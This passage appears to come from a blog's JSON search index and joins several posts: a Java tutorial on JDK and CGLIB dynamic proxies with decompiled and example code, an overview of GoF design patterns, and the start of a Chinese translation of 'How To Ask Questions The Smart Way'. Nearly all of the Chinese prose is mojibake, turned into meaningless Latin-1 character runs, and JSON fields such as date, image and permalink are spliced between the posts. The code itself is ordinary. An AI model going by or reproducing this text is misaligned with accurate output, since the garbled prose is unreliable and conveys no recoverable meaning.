è¢«è°ƒç”¨å¯¹è±¡æ–¹æ³•è¢«è°ƒç”¨åè¯¥å¦‚ä½•å¤„ç†\nJDKå®ç°åŸç† æˆ‘ä»¬å¯ä»¥åœ¨mainå‡½æ•°çš„æœ€å¼€å§‹æ·»åŠ è¿™æ®µä»£ç \n1 2 import sun.misc.ProxyGenerator; System.setProperty(\u0026#34;sun.misc.ProxyGenerator.saveGeneratedFiles\u0026#34;, \u0026#34;true\u0026#34;); mainå‡½æ•°æœ€åæ·»åŠ è¿™æ®µä»£ç \n1 2 3 4 5 try { Thread.sleep(new Random().nextInt(90000)); } catch (InterruptedException e) { throw new RuntimeException(e); } ç„¶åç›´æ¥æ‰§è¡Œï¼Œå¯ä»¥çœ‹åˆ°é¡¹ç›®ä¸­å‡ºç°äº†ä¸€äº›ä¸­é—´æ–‡ä»¶\nè¿™ä¸ªè‡ªåŠ¨ç”Ÿæˆçš„classæ–‡ä»¶æºç å¦‚ä¸‹\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 // // Source code recreated from a .class file by IntelliJ IDEA // (powered by FernFlower decompiler) // package org.dm.vulhub.Ser; import java.lang.reflect.InvocationHandler; import java.lang.reflect.Method; import java.lang.reflect.Proxy; import java.lang.reflect.UndeclaredThrowableException; final class $Proxy0 extends Proxy implements Movable { private static Method m1; private static Method m3; private static Method m2; private static Method m0; static { try { m1 = Class.forName(\u0026#34;java.lang.Object\u0026#34;).getMethod(\u0026#34;equals\u0026#34;, Class.forName(\u0026#34;java.lang.Object\u0026#34;)); m3 = Class.forName(\u0026#34;org.dm.vulhub.Ser.Movable\u0026#34;).getMethod(\u0026#34;move\u0026#34;); m2 = Class.forName(\u0026#34;java.lang.Object\u0026#34;).getMethod(\u0026#34;toString\u0026#34;); m0 = Class.forName(\u0026#34;java.lang.Object\u0026#34;).getMethod(\u0026#34;hashCode\u0026#34;); } catch (NoSuchMethodException var2) { throw new NoSuchMethodError(var2.getMessage()); } catch (ClassNotFoundException var3) { throw new NoClassDefFoundError(var3.getMessage()); } } public $Proxy0(InvocationHandler var1) throws { super(var1); } public final boolean equals(Object var1) throws { try { return (Boolean)super.h.invoke(this, m1, new Object[]{var1}); } catch (RuntimeException | Error var3) { throw var3; } catch (Throwable var4) { throw new UndeclaredThrowableException(var4); } } public final void move() throws { try { super.h.invoke(this, m3, (Object[])null); } catch (RuntimeException | Error var2) { throw var2; } catch (Throwable var3) { throw new UndeclaredThrowableException(var3); } } public final String toString() throws { try { return (String)super.h.invoke(this, m2, (Object[])null); } catch (RuntimeException | Error var2) { throw var2; } catch (Throwable var3) { throw new UndeclaredThrowableException(var3); } } public final int hashCode() throws { try { return (Integer)super.h.invoke(this, m0, (Object[])null); } catch (RuntimeException | Error var2) { throw var2; } catch (Throwable var3) { throw new UndeclaredThrowableException(var3); } } } å¯ä»¥çœ‹åˆ°14-17è¡Œå’Œæ¯ä¸ªå‡½æ•°çš„å…·ä½“å®ç°ï¼Œæ˜¯ä½¿ç”¨é™æ€ä»£ç†çš„ç»„åˆæ–¹å¼è¿›è¡Œçš„å…·ä½“å®ç°ã€‚\nè¿™ä¹Ÿå°±è§£é‡Šäº†ä¸ºä»€ä¹ˆéœ€è¦è¢«ä»£ç†å¯¹è±¡å¿…é¡»å®ç°æ¥å£ï¼Œå¦‚æœæ²¡æœ‰å®ç°æ¥å£ï¼Œä»£ç†ç±»å°±ä¸èƒ½ç¡®å®šéœ€è¦å®ç°å“ªäº›æ–¹æ³•è¿›è¡Œæ–¹æ³•å±‚é¢çš„ä»£ç†ã€‚\nCGLIBåŠ¨æ€ä»£ç† CGLib(Code Generate Library) ä¸JDKåŠ¨æ€ä»£ç†ä¸åŒçš„æ˜¯ï¼Œcglibç”Ÿæˆä»£ç†æ˜¯è¢«ä»£ç†å¯¹è±¡çš„å­ç±»ã€‚\nå› æ­¤å®ƒæ‹¥æœ‰ç»§æ‰¿æ–¹æ³•å®ç°é™æ€ä»£ç†çš„\nä¼˜ç‚¹ï¼šä¸éœ€è¦è¢«ä»£ç†å¯¹è±¡å®ç°æŸä¸ªæ¥å£ã€‚\nç¼ºç‚¹ï¼šä¸èƒ½ç»™finalç±»ç”Ÿæˆä»£ç†ï¼Œå› ä¸ºfinalç±»æ— æ³•æ‹¥æœ‰å­ç±»ã€‚\nä½¿ç”¨cglibç”Ÿæˆä»£ç†ç±»ä¹Ÿå¾ˆç®€å•ï¼Œåªè¦æŒ‡å®šçˆ¶ç±»å’Œå›è°ƒæ–¹æ³•å³å¯\né¦–å…ˆéœ€è¦å¼•å…¥ä¾èµ–\n1 2 3 4 5 \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;cglib\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;cglib\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;3.2.12\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; ç„¶åå®Œæ•´ä»£ç \n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 package org.dm.vulhub.Ser; import net.sf.cglib.proxy.Enhancer; import net.sf.cglib.proxy.MethodInterceptor; import net.sf.cglib.proxy.MethodProxy; import java.lang.reflect.Method; class TimeMethodInterceptor implements MethodInterceptor{ @Override public Object intercept(Object o, Method method, Object[] objects, MethodProxy methodProxy) throws Throwable { System.out.println(\u0026#34;ç”Ÿæˆçš„ç±»å\u0026#34;+o.getClass().getName()); System.out.println(\u0026#34;ç”Ÿæˆçš„ç±»çš„çˆ¶ç±»\u0026#34;+o.getClass().getSuperclass().getName()); System.out.println(\u0026#34;æ–¹æ³•æ‰§è¡Œå‰ï¼Œè¢«ä»£ç†çš„æ–¹æ³•\u0026#34;+method.getName()); Object result = null; result = methodProxy.invokeSuper(o, objects); System.out.println(\u0026#34;æ–¹æ³•æ‰§è¡Œåï¼Œè¢«ä»£ç†çš„æ–¹æ³•\u0026#34;+method.getName()); return result; } } class Tank{ public void move(){ System.out.println(\u0026#34;Tank moving clacla....\u0026#34;); } public static void main(String[] args) { Enhancer enhancer = new Enhancer(); // å¢å¼ºè€… enhancer.setSuperclass(Tank.class); // æŒ‡å®šçˆ¶ç±» enhancer.setCallback(new TimeMethodInterceptor()); // å½“è¢«ä»£ç†å¯¹è±¡çš„æ–¹æ³•è°ƒç”¨çš„æ—¶å€™ä¼šè°ƒç”¨ è¯¥å¯¹è±¡çš„intercept Tank tank = (Tank)enhancer.create(); // åŠ¨æ€ä»£ç†çš„ç”Ÿæˆ tank.move(); // ç”Ÿæˆä¹‹åä¼šè°ƒç”¨ } } SpringAop å¾…è¡¥å……ï¼ï¼ï¼ï¼\n","date":"2024-07-28T01:05:01+08:00","image":"https://d4n-picture-database.oss-cn-beijing.aliyuncs.com/img/image-20240728010634169.png","permalink":"https://d4n-sec.github.io/p/javaproxystudy/","title":"Javaä»£ç†æ¨¡å¼"},{"content":"è®¾è®¡æ¨¡å¼ è®¾è®¡æ¨¡å¼ç®€ä»‹ è®¾è®¡æ¨¡å¼ï¼ˆDesign patternï¼‰ä»£è¡¨äº†æœ€ä½³çš„å®è·µï¼Œé€šå¸¸è¢«æœ‰ç»éªŒçš„é¢å‘å¯¹è±¡çš„è½¯ä»¶å¼€å‘äººå‘˜æ‰€é‡‡ç”¨ã€‚è®¾è®¡æ¨¡å¼æ˜¯è½¯ä»¶å¼€å‘äººå‘˜åœ¨è½¯ä»¶å¼€å‘è¿‡ç¨‹ä¸­é¢ä¸´çš„ä¸€èˆ¬é—®é¢˜çš„è§£å†³æ–¹æ¡ˆã€‚è¿™äº›è§£å†³æ–¹æ¡ˆæ˜¯ä¼—å¤šè½¯ä»¶å¼€å‘äººå‘˜ç»è¿‡ç›¸å½“é•¿çš„ä¸€æ®µæ—¶é—´çš„è¯•éªŒå’Œé”™è¯¯æ€»ç»“å‡ºæ¥çš„ã€‚\nè®¾è®¡æ¨¡å¼æ˜¯ä¸€å¥—è¢«åå¤ä½¿ç”¨çš„ã€å¤šæ•°äººçŸ¥æ™“çš„ã€ç»è¿‡åˆ†ç±»ç¼–ç›®çš„ã€ä»£ç è®¾è®¡ç»éªŒçš„æ€»ç»“ã€‚ä½¿ç”¨è®¾è®¡æ¨¡å¼æ˜¯ä¸ºäº†é‡ç”¨ä»£ç ã€è®©ä»£ç æ›´å®¹æ˜“è¢«ä»–äººç†è§£ã€ä¿è¯ä»£ç å¯é æ€§ã€‚\næ¯«æ— ç–‘é—®ï¼Œè®¾è®¡æ¨¡å¼äºå·±äºä»–äººäºç³»ç»Ÿéƒ½æ˜¯å¤šèµ¢çš„ï¼Œè®¾è®¡æ¨¡å¼ä½¿ä»£ç ç¼–åˆ¶çœŸæ­£å·¥ç¨‹åŒ–ï¼Œè®¾è®¡æ¨¡å¼æ˜¯è½¯ä»¶å·¥ç¨‹çš„åŸºçŸ³ï¼Œå¦‚åŒå¤§å¦çš„ä¸€å—å—ç –çŸ³ä¸€æ ·ã€‚é¡¹ç›®ä¸­åˆç†åœ°è¿ç”¨è®¾è®¡æ¨¡å¼å¯ä»¥å®Œç¾åœ°è§£å†³å¾ˆå¤šé—®é¢˜ï¼Œæ¯ç§æ¨¡å¼åœ¨ç°å®ä¸­éƒ½æœ‰ç›¸åº”çš„åŸç†æ¥ä¸ä¹‹å¯¹åº”ï¼Œæ¯ç§æ¨¡å¼éƒ½æè¿°äº†ä¸€ä¸ªåœ¨æˆ‘ä»¬å‘¨å›´ä¸æ–­é‡å¤å‘ç”Ÿçš„é—®é¢˜ï¼Œä»¥åŠè¯¥é—®é¢˜çš„æ ¸å¿ƒè§£å†³æ–¹æ¡ˆï¼Œè¿™ä¹Ÿæ˜¯è®¾è®¡æ¨¡å¼èƒ½è¢«å¹¿æ³›åº”ç”¨çš„åŸå› ã€‚\nè®¾è®¡æ¨¡å¼æ¥æº è®¾è®¡æ¨¡å¼è¿™ä¸ªæœ¯è¯­æ˜¯ä¸Šä¸ªä¸–çºª90å¹´ä»£ç”±Erich Gammaã€Richard Helmã€Raplh Johnsonå’ŒJonhn Vlissideså››ä¸ªäººæ€»ç»“æç‚¼å‡ºæ¥çš„ï¼Œå¹¶ä¸”å†™äº†ä¸€æœ¬ Design Patterns çš„ä¹¦ã€‚è¿™å››äººä¹Ÿè¢«ç§°ä¸ºå››äººå¸®ï¼ˆGoFï¼‰ã€‚\nä»–ä»¬æ‰€æå‡ºçš„è®¾è®¡æ¨¡å¼ä¸»è¦æ˜¯åŸºäºä»¥ä¸‹çš„é¢å‘å¯¹è±¡è®¾è®¡åŸåˆ™ï¼š\nå¯¹æ¥å£ç¼–ç¨‹è€Œä¸æ˜¯å¯¹å®ç°ç¼–ç¨‹ ä¼˜å…ˆä½¿ç”¨å¯¹è±¡ç»„åˆè€Œä¸æ˜¯ç»§æ‰¿ è®¾è®¡æ¨¡å¼ä¼˜ç‚¹ æä¾›äº†ä¸€ç§å…±äº«çš„è®¾è®¡è¯æ±‡å’Œæ¦‚å¿µï¼Œä½¿å¼€å‘äººå‘˜èƒ½å¤Ÿæ›´å¥½åœ°æ²Ÿé€šå’Œç†è§£å½¼æ­¤çš„è®¾è®¡æ„å›¾ã€‚ æä¾›äº†ç»è¿‡éªŒè¯çš„è§£å†³æ–¹æ¡ˆï¼Œå¯ä»¥æé«˜è½¯ä»¶çš„å¯ç»´æŠ¤æ€§ã€å¯å¤ç”¨æ€§å’Œçµæ´»æ€§ã€‚ ä¿ƒè¿›äº†ä»£ç çš„é‡ç”¨ï¼Œé¿å…äº†é‡å¤çš„è®¾è®¡å’Œå®ç°ã€‚ é€šè¿‡éµå¾ªè®¾è®¡æ¨¡å¼ï¼Œå¯ä»¥å‡å°‘ç³»ç»Ÿä¸­çš„é”™è¯¯å’Œé—®é¢˜ï¼Œæé«˜ä»£ç è´¨é‡ã€‚ åŸºæœ¬åŸåˆ™ è®¾è®¡æ¨¡å¼åŸºäºä»¥ä¸‹å‡ ä¸ªåŸåˆ™ï¼Œå¯ä»¥è·³è¿‡ï¼Œä¸å½±å“å­¦ä¹ è®¾è®¡æ¨¡å¼\nå¼€é—­åŸåˆ™ Open Close Principle å¯¹æ‰©å±•å¼€æ”¾ï¼Œå¯¹ä¿®æ”¹å…³é—­ã€‚åœ¨ç¨‹åºéœ€è¦è¿›è¡Œæ‹“å±•çš„æ—¶å€™ï¼Œä¸èƒ½å»ä¿®æ”¹åŸæœ‰çš„ä»£ç ï¼Œå®ç°ä¸€ä¸ªçƒ­æ’æ‹”çš„æ•ˆæœã€‚\nç®€è¨€ä¹‹ï¼Œæ˜¯ä¸ºäº†ä½¿ç¨‹åºçš„æ‰©å±•æ€§å¥½ï¼Œæ˜“äºç»´æŠ¤å’Œå‡çº§ã€‚æƒ³è¦è¾¾åˆ°è¿™æ ·çš„æ•ˆæœï¼Œæˆ‘ä»¬éœ€è¦ä½¿ç”¨æ¥å£å’ŒæŠ½è±¡ç±»ï¼Œåé¢çš„å…·ä½“è®¾è®¡ä¸­æˆ‘ä»¬ä¼šæåˆ°è¿™ç‚¹ã€‚\né‡Œæ°ä»£æ¢åŸåˆ™ Liskov Substitution Principleï¼ˆLSPï¼‰ ä»»ä½•åŸºç±»å¯ä»¥å‡ºç°çš„åœ°æ–¹ï¼Œå­ç±»ä¸€å®šå¯ä»¥å‡ºç°ã€‚LSP æ˜¯ç»§æ‰¿å¤ç”¨çš„åŸºçŸ³ï¼Œåªæœ‰å½“æ´¾ç”Ÿç±»å¯ä»¥æ›¿æ¢æ‰åŸºç±»ï¼Œä¸”è½¯ä»¶å•ä½çš„åŠŸèƒ½ä¸å—åˆ°å½±å“æ—¶ï¼ŒåŸºç±»æ‰èƒ½çœŸæ­£è¢«å¤ç”¨ï¼Œè€Œæ´¾ç”Ÿç±»ä¹Ÿèƒ½å¤Ÿåœ¨åŸºç±»çš„åŸºç¡€ä¸Šå¢åŠ æ–°çš„è¡Œä¸ºã€‚\né‡Œæ°ä»£æ¢åŸåˆ™æ˜¯å¯¹å¼€é—­åŸåˆ™çš„è¡¥å……ã€‚å®ç°å¼€é—­åŸåˆ™çš„å…³é”®æ­¥éª¤å°±æ˜¯æŠ½è±¡åŒ–ï¼Œè€ŒåŸºç±»ä¸å­ç±»çš„ç»§æ‰¿å…³ç³»å°±æ˜¯æŠ½è±¡åŒ–çš„å…·ä½“å®ç°ï¼Œæ‰€ä»¥é‡Œæ°ä»£æ¢åŸåˆ™æ˜¯å¯¹å®ç°æŠ½è±¡åŒ–çš„å…·ä½“æ­¥éª¤çš„è§„èŒƒã€‚\nä¾èµ–å€’è½¬åŸåˆ™ Dependence Inversion Principle å¼€é—­åŸåˆ™çš„åŸºç¡€ï¼Œå…·ä½“å†…å®¹ï¼šé’ˆå¯¹æ¥å£ç¼–ç¨‹ï¼Œä¾èµ–äºæŠ½è±¡è€Œä¸ä¾èµ–äºå…·ä½“ã€‚\næ¥å£éš”ç¦»åŸåˆ™ Interface Segregation Principle ä½¿ç”¨å¤šä¸ªéš”ç¦»çš„æ¥å£ï¼Œæ¯”ä½¿ç”¨å•ä¸ªæ¥å£è¦å¥½ã€‚\nå®ƒè¿˜æœ‰å¦å¤–ä¸€ä¸ªæ„æ€æ˜¯ï¼šé™ä½ç±»ä¹‹é—´çš„è€¦åˆåº¦ã€‚ç”±æ­¤å¯è§ï¼Œå…¶å®è®¾è®¡æ¨¡å¼å°±æ˜¯ä»å¤§å‹è½¯ä»¶æ¶æ„å‡ºå‘ã€ä¾¿äºå‡çº§å’Œç»´æŠ¤çš„è½¯ä»¶è®¾è®¡æ€æƒ³ï¼Œå®ƒå¼ºè°ƒé™ä½ä¾èµ–ï¼Œé™ä½è€¦åˆã€‚\næœ€å°‘çŸ¥é“åŸåˆ™ Demeter Principle åˆç§°è¿ªç±³ç‰¹æ³•åˆ™ï¼Œæ˜¯æŒ‡ä¸€ä¸ªå®ä½“åº”å½“å°½é‡å°‘åœ°ä¸å…¶ä»–å®ä½“ä¹‹é—´å‘ç”Ÿç›¸äº’ä½œç”¨ï¼Œä½¿å¾—ç³»ç»ŸåŠŸèƒ½æ¨¡å—ç›¸å¯¹ç‹¬ç«‹ã€‚\nåˆæˆå¤ç”¨åŸåˆ™ Composite Reuse Principle æ˜¯æŒ‡ï¼šå°½é‡ä½¿ç”¨åˆæˆ/èšåˆçš„æ–¹å¼ï¼Œè€Œä¸æ˜¯ä½¿ç”¨ç»§æ‰¿ã€‚\nè®¾è®¡æ¨¡å¼çš„åˆ†ç±» å‚è€ƒå››äººå¸®çš„ä¹¦ç±ï¼š Design Patterns - Elements of Reusable Object-Oriented Softwareï¼ˆä¸­æ–‡è¯‘åï¼šè®¾è®¡æ¨¡å¼ - å¯å¤ç”¨çš„é¢å‘å¯¹è±¡è½¯ä»¶å…ƒç´ ï¼‰\nåˆ›å»ºå‹æ¨¡å¼ è¿™äº›è®¾è®¡æ¨¡å¼æä¾›äº†ä¸€ç§åœ¨åˆ›å»ºå¯¹è±¡çš„åŒæ—¶éšè—åˆ›å»ºé€»è¾‘çš„æ–¹å¼ï¼Œè€Œä¸æ˜¯ä½¿ç”¨ new è¿ç®—ç¬¦ç›´æ¥å®ä¾‹åŒ–å¯¹è±¡ã€‚è¿™ä½¿å¾—ç¨‹åºåœ¨åˆ¤æ–­é’ˆå¯¹æŸä¸ªç»™å®šå®ä¾‹éœ€è¦åˆ›å»ºå“ªäº›å¯¹è±¡æ—¶æ›´åŠ çµæ´»ã€‚\nåŒ…å«ï¼š\nå·¥å‚æ¨¡å¼ï¼ˆFactory Patternï¼‰ æŠ½è±¡å·¥å‚æ¨¡å¼ï¼ˆAbstract Factory Patternï¼‰ å•ä¾‹æ¨¡å¼ï¼ˆSingleton Patternï¼‰ å»ºé€ è€…æ¨¡å¼ï¼ˆBuilder Patternï¼‰ åŸå‹æ¨¡å¼ï¼ˆPrototype Patternï¼‰ ç»“æ„å‹æ¨¡å¼ è¿™äº›æ¨¡å¼å…³æ³¨å¯¹è±¡ä¹‹é—´çš„ç»„åˆå’Œå…³ç³»ï¼Œæ—¨åœ¨è§£å†³å¦‚ä½•æ„å»ºçµæ´»ä¸”å¯å¤ç”¨çš„ç±»å’Œå¯¹è±¡ç»“æ„ã€‚\nåŒ…å«ï¼š\né€‚é…å™¨æ¨¡å¼ï¼ˆAdapter Patternï¼‰ æ¡¥æ¥æ¨¡å¼ï¼ˆBridge Patternï¼‰ è¿‡æ»¤å™¨æ¨¡å¼ï¼ˆFilterã€Criteria Patternï¼‰ï¼ˆéä¸»æµçš„åˆ†ç±»ï¼‰ ç»„åˆæ¨¡å¼ï¼ˆComposite Patternï¼‰ è£…é¥°å™¨æ¨¡å¼ï¼ˆDecorator Patternï¼‰ å¤–è§‚æ¨¡å¼ï¼ˆFacade Patternï¼‰ äº«å…ƒæ¨¡å¼ï¼ˆFlyweight Patternï¼‰ ä»£ç†æ¨¡å¼ï¼ˆProxy Patternï¼‰ è¡Œä¸ºå‹æ¨¡å¼ è¿™äº›æ¨¡å¼å…³æ³¨å¯¹è±¡ä¹‹é—´çš„é€šä¿¡å’Œäº¤äº’ï¼Œæ—¨åœ¨è§£å†³å¯¹è±¡ä¹‹é—´çš„è´£ä»»åˆ†é…å’Œç®—æ³•çš„å°è£…ã€‚\nåŒ…å«ï¼š\nè´£ä»»é“¾æ¨¡å¼ï¼ˆChain of Responsibility Patternï¼‰ å‘½ä»¤æ¨¡å¼ï¼ˆCommand Patternï¼‰ è§£é‡Šå™¨æ¨¡å¼ï¼ˆInterpreter Patternï¼‰ è¿­ä»£å™¨æ¨¡å¼ï¼ˆIterator Patternï¼‰ ä¸­ä»‹è€…æ¨¡å¼ï¼ˆMediator Patternï¼‰ å¤‡å¿˜å½•æ¨¡å¼ï¼ˆMemento Patternï¼‰ è§‚å¯Ÿè€…æ¨¡å¼ï¼ˆObserver Patternï¼‰ çŠ¶æ€æ¨¡å¼ï¼ˆState Patternï¼‰ ç©ºå¯¹è±¡æ¨¡å¼ï¼ˆNull Object Patternï¼‰ï¼ˆéä¸»æµçš„åˆ†ç±»ï¼‰ ç­–ç•¥æ¨¡å¼ï¼ˆStrategy Patternï¼‰ æ¨¡æ¿æ¨¡å¼ï¼ˆTemplate Patternï¼‰ è®¿é—®è€…æ¨¡å¼ï¼ˆVisitor Patternï¼‰ J2EE æ¨¡å¼ æ­¤é¡¹æ˜¯éä¸»æµçš„åˆ†ç±»ï¼Œè¿™äº›è®¾è®¡æ¨¡å¼ç‰¹åˆ«å…³æ³¨è¡¨ç¤ºå±‚ã€‚è¿™äº›æ¨¡å¼æ˜¯ç”± Sun Java Center é‰´å®šçš„ã€‚\nMVC æ¨¡å¼ï¼ˆMVC Patternï¼‰ ä¸šåŠ¡ä»£è¡¨æ¨¡å¼ï¼ˆBusiness Delegate Patternï¼‰ ç»„åˆå®ä½“æ¨¡å¼ï¼ˆComposite Entity Patternï¼‰ æ•°æ®è®¿é—®å¯¹è±¡æ¨¡å¼ï¼ˆData Access Object Patternï¼‰ å‰ç«¯æ§åˆ¶å™¨æ¨¡å¼ï¼ˆFront Controller Patternï¼‰ æ‹¦æˆªè¿‡æ»¤å™¨æ¨¡å¼ï¼ˆIntercepting Filter Patternï¼‰ æœåŠ¡å®šä½å™¨æ¨¡å¼ï¼ˆService Locator Patternï¼‰ ä¼ è¾“å¯¹è±¡æ¨¡å¼ï¼ˆTransfer Object Patternï¼‰ è®¾è®¡æ¨¡å¼ä¸»è¦æ˜¯åŸºäºOOPç¼–ç¨‹æç‚¼çš„ï¼Œè€ŒOOPç¼–ç¨‹æœ€å…¸å‹çš„è¯­è¨€ä¸ºJavaï¼Œæ‰€ä»¥å…·ä½“å®ä¾‹æ–‡ç« ä½¿ç”¨Javaä»£ç ä½œä¸ºç¤ºä¾‹\næ³¨æ„ï¼šæœ¬è´¨æ˜¯å­¦ä¹ è®¾è®¡æ€ç»´è€Œéä»£ç å­¦ä¹ ï¼Œæ‰€ä»¥éœ€è¦ä¸€å®šçš„JavaåŸºç¡€ã€‚\nè¡¥å…… OOPï¼šObject-oriented Programmingï¼Œå³é¢å‘å¯¹è±¡ç¼–ç¨‹\nGoFï¼šGang of Fourï¼Œå³å››äººå¸®\nå‚è€ƒé“¾æ¥ èœé¸Ÿ\n","date":"2024-07-28T00:05:01+08:00","image":"https://d4n-picture-database.oss-cn-beijing.aliyuncs.com/img/image-20240805210553120.png","permalink":"https://d4n-sec.github.io/p/designmode/","title":"ç¨‹åºçš„è®¾è®¡æ¨¡å¼"},{"content":"å¦‚ä¾µç§’åˆ \næé—®çš„æ™ºæ…§ How To Ask Questions The Smart Way\nCopyright Â© 2001,2006,2014 Eric S. Raymond, Rick Moen\næœ¬æŒ‡å—è‹±æ–‡ç‰ˆç‰ˆæƒä¸º Eric S. Raymond, Rick Moen æ‰€æœ‰ã€‚\nåŸæ–‡ç½‘å€ï¼šhttp://www.catb.org/~esr/faqs/smart-questions.html\nCopyleft 2001 by D.H.Grand(nOBODY/Ginux), 2010 by Gasolin, 2015 by Ryan Wu\næœ¬ä¸­æ–‡æŒ‡å—æ˜¯åŸºäºåŸæ–‡ 3.10 ç‰ˆä»¥åŠ 2010 å¹´ç”± Gasolin æ‰€ç¿»è¯‘ç‰ˆæœ¬çš„æœ€æ–°ç¿»è¯‘ï¼›\nååŠ©æŒ‡å‡ºç¿»è¯‘é—®é¢˜ï¼Œè¯·å‘ issueï¼Œæˆ–ç›´æ¥å‘ pull request ç»™æˆ‘ã€‚\næœ¬æ–‡å¦æœ‰ç¹é«”ä¸­æ–‡ç‰ˆã€‚\nåŸæ–‡ç‰ˆæœ¬å†å² ç›®å½• å£°æ˜ ç®€ä»‹ åœ¨æé—®ä¹‹å‰ å½“ä½ æé—®æ—¶ æ…é€‰æé—®çš„è®ºå› Stack Overflow ç½‘ç«™å’Œ IRC è®ºå› ç¬¬äºŒæ­¥ï¼Œä½¿ç”¨é¡¹ç›®é‚®ä»¶åˆ—è¡¨ ä½¿ç”¨æœ‰æ„ä¹‰ä¸”æè¿°æ˜ç¡®çš„æ ‡é¢˜ ä½¿é—®é¢˜å®¹æ˜“å›å¤ ä½¿ç”¨æ¸…æ™°ã€æ­£ç¡®ã€ç²¾å‡†ä¸”åˆä¹è¯­æ³•çš„è¯­å¥ ä½¿ç”¨æ˜“äºè¯»å–ä¸”æ ‡å‡†çš„æ–‡ä»¶æ ¼å¼å‘é€é—®é¢˜ ç²¾ç¡®åœ°æè¿°é—®é¢˜å¹¶è¨€ä¹‹æœ‰ç‰© è¯ä¸åœ¨å¤šè€Œåœ¨ç²¾ åˆ«åŠ¨è¾„å£°ç§°æ‰¾åˆ° Bug ä½å£°ä¸‹æ°”ä¸èƒ½ä»£æ›¿ä½ çš„åŠŸè¯¾ æè¿°é—®é¢˜ç—‡çŠ¶è€Œéä½ çš„çŒœæµ‹ æŒ‰å‘ç”Ÿæ—¶é—´å…ˆååˆ—å‡ºé—®é¢˜ç—‡çŠ¶ æè¿°ç›®æ ‡è€Œä¸æ˜¯è¿‡ç¨‹ åˆ«è¦æ±‚ä½¿ç”¨ç§äººç”µé‚®å›å¤ æ¸…æ¥šæ˜ç¡®åœ°è¡¨è¾¾ä½ çš„é—®é¢˜ä»¥åŠéœ€æ±‚ è¯¢é—®æœ‰å…³ä»£ç çš„é—®é¢˜æ—¶ åˆ«æŠŠè‡ªå·±å®¶åº­ä½œä¸šçš„é—®é¢˜è´´ä¸Šæ¥ å»æ‰æ— æ„ä¹‰çš„æé—®å¥ å³ä½¿ä½ å¾ˆæ€¥ä¹Ÿä¸è¦åœ¨æ ‡é¢˜å†™ç´§æ€¥ ç¤¼å¤šäººä¸æ€ªï¼Œè€Œä¸”æœ‰æ—¶è¿˜å¾ˆæœ‰å¸®åŠ© é—®é¢˜è§£å†³åï¼ŒåŠ ä¸ªç®€çŸ­çš„è¡¥å……è¯´æ˜ å¦‚ä½•è§£è¯»ç­”æ¡ˆ RTFM å’Œ STFWï¼šå¦‚ä½•çŸ¥é“ä½ å·²å®Œå…¨æç ¸äº† å¦‚æœè¿˜æ˜¯æä¸æ‡‚ å¤„ç†æ— ç¤¼çš„å›åº” å¦‚ä½•é¿å…æ‰®æ¼”å¤±è´¥è€… ä¸è¯¥é—®çš„é—®é¢˜ å¥½é—®é¢˜ä¸è ¢é—®é¢˜ å¦‚æœå¾—ä¸åˆ°å›ç­” å¦‚ä½•æ›´å¥½åœ°å›ç­”é—®é¢˜ ç›¸å…³èµ„æº é¸£è°¢ å£°æ˜ è®¸å¤šé¡¹ç›®åœ¨ä»–ä»¬ç½‘ç«™çš„å¸®åŠ©æ–‡æ¡£ä¸­é“¾æ¥äº†æœ¬æŒ‡å—ã€‚è¿™å¾ˆå¥½ï¼Œè¿™æ­£æ˜¯æˆ‘ä»¬æƒ³è¦çš„ç”¨é€”ã€‚ä½†å¦‚æœä½ æ˜¯è¯¥é¡¹ç›®ç®¡ç†å‘˜å¹¶è¯•å›¾åˆ›å»ºæŒ‡å‘æœ¬æŒ‡å—çš„è¶…é“¾æ¥ï¼Œè¯·åœ¨è¶…é“¾æ¥é™„è¿‘çš„æ˜¾è‘—ä½ç½®æ³¨æ˜ï¼š\næœ¬æŒ‡å—ä¸æä¾›æ­¤é¡¹ç›®çš„å®é™…æ”¯æŒæœåŠ¡ï¼\næˆ‘ä»¬å·²ç»æ·±åˆ»é¢†æ•™åˆ°ç¼ºå°‘ä¸Šè¿°å£°æ˜æ‰€å¸¦æ¥çš„ç—›è‹¦ï¼šæˆ‘ä»¬å°†ä¸åœåœ°è¢«é‚£äº›è®¤ä¸ºå‘å¸ƒè¿™æœ¬æŒ‡å—å°±æ„å‘³ç€æœ‰è´£ä»»è§£å†³ä¸–ä¸Šæ‰€æœ‰æŠ€æœ¯é—®é¢˜çš„å‚»ç“œè‹¦è‹¦çº ç¼ ã€‚\nå¦‚æœä½ å› å¯»æ±‚æŸäº›å¸®åŠ©è€Œé˜…è¯»æœ¬æŒ‡å—ï¼Œå¹¶åœ¨ç¦»å¼€æ—¶è¿˜è§‰å¾—å¯ä»¥ä»æœ¬æ–‡ä½œè€…è¿™é‡Œå¾—åˆ°ç›´æ¥å¸®åŠ©ï¼Œé‚£ä½ å°±æ˜¯æˆ‘ä»¬ä¹‹å‰è¯´çš„é‚£äº›å‚»ç“œä¹‹ä¸€ã€‚åˆ«é—®æˆ‘ä»¬é—®é¢˜ï¼Œæˆ‘ä»¬åªä¼šå¿½ç•¥ä½ ã€‚æˆ‘ä»¬åœ¨è¿™æœ¬æŒ‡å—ä¸­æƒ³æ•™ä½ å¦‚ä½•ä»é‚£äº›çœŸæ­£æ‡‚å¾—ä½ æ‰€é‡åˆ°çš„è½¯ä»¶æˆ–ç¡¬ä»¶é—®é¢˜çš„äººå¤„å–å¾—ååŠ©ï¼Œè€Œ 99% çš„æƒ…å†µä¸‹é‚£ä¸ä¼šæ˜¯æˆ‘ä»¬ã€‚é™¤éä½ ç¡®å®šæœ¬æŒ‡å—çš„ä½œè€…ä¹‹ä¸€åˆšå¥½æ˜¯ä½ æ‰€é‡åˆ°çš„é—®é¢˜é¢†åŸŸçš„ä¸“å®¶ï¼Œå¦åˆ™è¯·ä¸è¦æ‰“æ‰°æˆ‘ä»¬ï¼Œè¿™æ ·å¤§å®¶éƒ½ä¼šå¼€å¿ƒä¸€ç‚¹ã€‚\nç®€ä»‹ 